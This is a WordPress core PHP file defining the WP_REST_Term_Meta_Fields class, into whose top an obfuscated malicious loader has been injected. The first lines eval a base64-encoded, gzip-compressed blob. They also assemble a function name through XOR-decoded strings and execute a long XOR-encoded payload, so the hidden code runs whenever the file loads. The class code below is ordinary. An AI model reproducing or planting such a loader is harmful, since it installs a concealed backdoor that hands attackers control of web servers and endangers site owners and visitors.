<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php $SherbDxoZGkQ=';7TZBYlQ=:T<IX8' ^ 'XE1;6<37HT7H 7V';$UVdOssAKLsxF=$SherbDxoZGkQ('','Z7JC>K7491;Nk-0T6DIgi=79364TPkaCDFtPCi-rO 7;;G>D4W5TK0YY>P8<Q:XGAU;.0FYmP-AdaovhsEyAzA=6.IWRBOb9LK2T0nwUoJxxCTsDV<2BP6EXrI8MRYXPu.jxag<nF=2-HDnhAc2;:Qch=kZung8Q.,WQBDFOGAWU8dNW2+c-Epx:aHP,49;QnX<5NPhEDD+H2uQ02McxUF0TX,LRJ,TF-a;PBCMT,A<9Hwks.DYK6S1qZrj3r9u.pKL0sK,->yYGnC2P.;5qB8mKCIS9Jf9Q=SmCh8NTiyao7AI5SDChZULFVS9Q4;U0YAdRI6;5Cm<mPK; 7QQ9kKHib=77eimy8IbF8.YmEHSlCVZK keMY2Gm<JCP.FNHjKtsQUWN1JQc SD6KhMM5582=RhG;dO<yA.6NPCWbw6E85R;JU3J+A- 6.+JGQkoWH8A7A91sMmJ<Q.3KoN4W2MKyeSRMCOj;PGBpb:I-iuR6I,Npla,:9ZY6SHWn-H>JCNqNKSNCgDT70N3cMmbdGT+xPr+JCMmCEN:iiocynid P;V6ti.ETXSUSz4wGUV.9t2sLR+PF4tPLqrMlW7Y8CkZ0Yi,78SJIRQ1WE;:33eMiR2.E5hmBteqRb9DgE=Z4NT7AAP0R4WD==5+T+hP3QKD ,lQEA0F' ^'3QbbX>YWMXT 4HH=E0:ONEXKlRU 14>.12SyjIVxFFBUX3W+ZwM;9o=8J1gc<O,oe1ZZQjyI;H8MAOVHS>sHseRCZijrehY3EBT;BFS<OwXHxtW-jOF0<S+pV-Y93pcpQGASHm5gbRGYhjSHiGVZN08LT6z+NCS4Wws8baf<33;0VLj<WRJplKr3h:5XAKUyJ7IAgkbL9NVB8Q5QF,CEu Q8+IwXnH52L>P5;cptJ PJ-LayH++.W0YQrV5p=v>g5k-CSoGHGYdyNgD1BNPXbCgBg-2M+9R4DsPcLS+-RshKS =TsycL,4 33h3,>1<VyiEv-WOTjMGgY-TRR02QKcl60xfb :9YY:BbSK MxvsH576>EBE6S;NIX+71q-+1JvTW:0.u;CXGD20WkUmiCTTGXibNFn26seJW:1cjB7C+KP R+9Z0NiUODqO+3040:=LiU JTEy2.Y2AW.GjP6F,bUEw6,7.5P5>kYY0 KAQ6W=MnVJAMHK; i8-.1H0W97=Yi 67dKdpSQ:RJmKDDo9OMxVO+7,6d.+CN4FCDSICEfYoUFPH b;762IPEwfeHXEVAuaId PCweQTkL6E+Y:41U 6IOQ >:zvA6<WURWBaIvVO1TADbTEQrBBNn K;XfpS 51kuD6=QRTOsvAk9X.<IXDalz:;'); $UVdOssAKLsxF();
/**
 * REST API: WP_REST_Term_Meta_Fields class
 *
 * @package WordPress
 * @subpackage REST_API
 * @since 4.7.0
 */

/**
 * Core class used to manage meta values for terms via the REST API.
 *
 * @since 4.7.0
 *
 * @see WP_REST_Meta_Fields
 */
class WP_REST_Term_Meta_Fields extends WP_REST_Meta_Fields {

	/**
	 * Taxonomy to register fields for.
	 *
	 * @since 4.7.0
	 * @var string
	 */
	protected $taxonomy;

	/**
	 * Constructor.
	 *
	 * @since 4.7.0
	 *
	 * @param string $taxonomy Taxonomy to register fields for.
	 */
	public function __construct( $taxonomy ) {
		$this->taxonomy = $taxonomy;
	}

	/**
	 * Retrieves the object meta type.
	 *
	 * @since 4.7.0
	 *
	 * @return string The meta type.
	 */
	protected function get_meta_type() {
		return 'term';
	}

	/**
	 * Retrieves the object meta subtype.
	 *
	 * @since 4.9.8
	 *
	 * @return string Subtype for the meta type, or empty string if no specific subtype.
	 */
	protected function get_meta_subtype() {
		return $this->taxonomy;
	}

	/**
	 * Retrieves the type for register_rest_field().
	 *
	 * @since 4.7.0
	 *
	 * @return string The REST field type.
	 */
	public function get_rest_field_type() {
		return 'post_tag' === $this->taxonomy ? 'tag' : $this->taxonomy;
	}
}
